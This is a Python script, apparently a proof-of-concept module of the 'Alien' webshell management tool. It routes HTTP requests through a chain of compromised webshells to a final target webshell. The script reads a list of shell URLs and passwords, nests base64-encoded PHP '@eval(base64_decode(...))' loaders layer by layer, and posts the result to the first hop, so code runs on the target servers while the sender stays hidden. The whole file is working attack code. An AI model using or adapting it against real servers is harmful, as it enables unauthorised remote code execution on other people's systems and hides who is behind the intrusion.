'''
Name: DriftingComet
Author: iss4cf0ng/ISSAC
URL: https://github.com/iss4cf0ng/Alien

Description:
    This script is a specialized subproject of Alien webshell management tool.
    This algorithm is a proof-of-concept for its multi-hop webshell routing module.

    HTTP request:   [Alien] -> [Hop1] -> [Hop2] -> [Hop3] -> ... -> [HopN] -> [Target web server]
    HTTP response:  [Alien] <- [Hop1] <- [Hop2] <- [Hop3] <- ... <- [HopN] <- [Target web server]

'''

import requests
import argparse
import base64

parser = argparse.ArgumentParser()
parser.add_argument('--url', type=str, help='Target webshell url (final destination)')
parser.add_argument('--password', type=str, help='Webshell\'s password')
parser.add_argument('--file', type=str, default='shell.txt', help='Webshells file for routing')
parser.add_argument('--count', type=int, default=1, help='Times of routing')
args = parser.parse_args()

dicLoader = {
    'php' : '@eval(base64_decode("[PATTERN]"));',
}

PAYLOAD_EXEC = 'echo("Nihahahaha");'

def main():

    dicShells = dict()

    with open(args.file, 'r') as f:
        for line in f.readlines():
            if not line or not '|' in line:
                continue

            split = line.split('|')
            dicShells[split[0]] = split[1].strip().strip('\r').strip('\n') # shell url : password

    if len(dicShells.keys()) == 0:
        print('[!] shell list is empty')
        return

    with open('./payloads/comet.php', 'r') as f:
        comet_payload = f.read()

    comet_payload = comet_payload.strip('<?php').strip('?>')
    comet_backup = comet_payload

    payload = dicLoader['php'].replace('[PATTERN]', base64.b64encode(PAYLOAD_EXEC.encode('utf-8')).decode('utf-8'))
    payload = f'{args.password}={payload}'

    first_url = ''

    for url in dicShells.keys():
        for i in range(args.count):
            password = dicShells[url]

            comet_payload = comet_backup
            comet_payload = comet_payload.replace('$_POST[\'z0\']', f'"{base64.b64encode(url.encode("utf-8")).decode("utf-8")}"')
            comet_payload = comet_payload.replace('$_POST[\'z1\']', f'"{base64.b64encode(payload.encode("utf-8")).decode("utf-8")}"')

            payload = dicLoader['php'].replace('[PATTERN]', base64.b64encode(comet_payload.encode("utf-8")).decode("utf-8"))
            payload = f'{password}={payload}'
        
            first_url = url

    password = dicShells[first_url]
    
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    resp = requests.post(url=first_url, data=payload, headers=headers)
    print(resp.content)

if __name__ == '__main__':
    main()